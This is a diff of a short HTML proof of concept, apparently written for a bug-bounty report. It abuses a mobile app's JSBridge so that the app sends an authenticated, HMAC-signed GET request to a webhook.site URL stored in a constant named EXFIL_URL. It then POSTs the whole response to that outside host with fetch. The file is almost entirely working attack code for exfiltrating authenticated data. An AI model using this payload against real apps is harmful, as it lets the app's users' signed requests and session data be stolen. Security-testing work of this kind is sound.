@@ -1,11 +1,20 @@
-<!-- simple.html -->
+<!-- 
+  超简 PoC：验证 JSBridge 是否会自动添加 HMAC 签名
+  作者：Ultimate SRC 助手
+-->
 <script>
-  // 尝试发起一个带签名的 GET 请求（URL 指向 webhook.site）
+  // 目标：让 App 向 webhook.site 发起带签名的 GET 请求
+  // 替换下面 URL 为你自己的 webhook.site 地址！
+  const EXFIL_URL = "https://webhook.site/8dd3d2c8-6e93-4e10-92df-de8a2bb70519";
+
   JSBridge.call('httpRequest', {
     method: 'GET',
-    url: 'https://webhook.site/8dd3d2c8-6e93-4e10-92df-de8a2bb70519',  // ← 替换成你的 webhook URL
-    authentication: { is_authenticated: true }
+    url: EXFIL_URL,
+    authentication: {
+      is_authenticated: true
+    }
   }, function(response) {
-    console.log("Done:", response);
+    // 可选：再发一次响应内容（用于调试）
+    fetch(EXFIL_URL + "/callback", { method: "POST", body: JSON.stringify(response) });
   });
 </script>
